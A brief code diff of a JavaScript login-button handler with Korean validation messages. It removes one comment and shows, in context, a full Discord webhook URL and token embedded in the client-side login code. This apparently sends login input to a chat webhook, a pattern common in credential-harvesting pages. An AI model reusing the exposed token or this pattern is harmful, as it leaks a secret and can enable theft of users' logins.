@@ -8,7 +8,7 @@ document.getElementById('login-button').addEventListener('click', function() {
     if (!emailPattern.test(email)) {
         messageElement.textContent = '유효한 이메일 주소를 입력하세요.';
         messageElement.style.color = '#ff0000';
-        return; // 유효하지 않으면 함수 종료
+        return;
     }
 
     const webhookURL = 'https://discord.com/api/webhooks/1312724758500216882/POMdK4RsYUMWFmYtpz81FE-xyPd4coVmBBCpix4jsQVCdL27avEBXS9ZMYnm2Kz7oc2p';
